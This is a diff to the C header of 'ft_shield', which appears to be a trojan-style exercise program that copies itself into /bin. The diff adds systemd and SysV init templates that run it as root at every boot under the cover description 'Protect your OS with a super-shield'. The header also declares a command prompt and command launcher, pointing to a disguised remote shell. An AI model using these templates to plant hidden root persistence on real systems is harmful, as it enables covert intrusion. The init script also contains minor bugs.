@@ -11,6 +11,7 @@
 # include <string.h>
 # include <sys/select.h>
 # include <sys/socket.h>
+# include <sys/stat.h>
 # include <sys/wait.h>
 # include <unistd.h>
 
@@ -18,20 +19,6 @@
 # define PRG_NAME "ft_shield"
 # define TARGET_LOCATION "/bin"
 # define PROC_SELF_EXE "/proc/self/exe"
-
-# define SYSTEMD_CONF_DIR "/etc/systemd/system"
-# define SYSTEMD_CONFIG "[Unit]\n\
-Description=Protect your OS with a super-shield\n\
-\n\
-[Service]\n\
-User=root\n\
-WorkingDirectory=%s\n\
-ExecStart=%s\n\
-Restart=always\n\
-\n\
-[Install]\n\
-WantedBy=multi-user.target\n"
-# define SYSTEMD_
 
 # define PROMPT "$> "
 
@@ -84,5 +71,87 @@ void		launch_command(t_serv *serv, int fd, char *cmd);
 
 /* sha256.c */
 char		*sha256(char *str, size_t size);
+
+# define SYSTEMD_CONF_DIR "/etc/systemd/system"
+# define SYSTEMD_CONFIG "[Unit]\n\
+Description=Protect your OS with a super-shield\n\
+\n\
+[Service]\n\
+User=root\n\
+WorkingDirectory=%s\n\
+ExecStart=%s\n\
+Restart=always\n\
+\n\
+[Install]\n\
+WantedBy=multi-user.target\n"
+
+# define SYSV_CONF_DIR "/etc/init.d"
+# define SYSV_CONFIG "#!/bin/sh\n\
+### BEGIN INIT INFO\n\
+# Provides:          <NAME>\n\
+# Required-Start:    $local_fs $network $named $time $syslog\n\
+# Required-Stop:     $local_fs $network $named $time $syslog\n\
+# Default-Start:     2 3 4 5\n\
+# Default-Stop:      0 1 6\n\
+# Description:       <DESCRIPTION>\n\
+### END INIT INFO\n\
+\n\
+SCRIPT=%s\n\
+RUNAS=root\n\
+\n\
+PIDFILE=/var/run/%2$s.pid\n\
+LOGFILE=/var/log/%2$s.log\n\
+\n\
+start() {\n\
+  if [ -f /var/run/$PIDNAME ] && kill -0 $(cat /var/run/$PIDNAME); then\n\
+    echo 'Service already running' >&2\n\
+    return 1\n\
+  fi\n\
+  echo 'Starting service…' >&2\n\
+  local CMD=\"$SCRIPT &> \\\"$LOGFILE\\\" & echo \\$!\"\n\
+  su -c \"$CMD\" $RUNAS > \"$PIDFILE\"\n\
+  echo 'Service started' >&2\n\
+}\n\
+\n\
+stop() {\n\
+  if [ ! -f \"$PIDFILE\" ] || ! kill -0 $(cat \"$PIDFILE\"); then\n\
+    echo 'Service not running' >&2\n\
+    return 1\n\
+  fi\n\
+  echo 'Stopping service…' >&2\n\
+  kill -15 $(cat \"$PIDFILE\") && rm -f \"$PIDFILE\"\n\
+  echo 'Service stopped' >&2\n\
+}\n\
+\n\
+uninstall() {\n\
+  echo -n \"Are you really sure you want to uninstall this service? That cannot be undone. [yes|No] \"\n\
+  local SURE\n\
+  read SURE\n\
+  if [ \"$SURE\" = \"yes\" ]; then\n\
+    stop\n\
+    rm -f \"$PIDFILE\"\n\
+    echo \"Notice: log file is not be removed: '$LOGFILE'\" >&2\n\
+    update-rc.d -f <NAME> remove\n\
+    rm -fv \"$0\"\n\
+  fi\n\
+}\n\
+\n\
+case \"$1\" in\n\
+  start)\n\
+    start\n\
+    ;;\n\
+  stop)\n\
+    stop\n\
+    ;;\n\
+  uninstall)\n\
+    uninstall\n\
+    ;;\n\
+  retart)\n\
+    stop\n\
+    start\n\
+    ;;\n\
+  *)\n\
+    echo \"Usage: $0 {start|stop|restart|uninstall}\"\n\
+esac\n"
 
 #endif
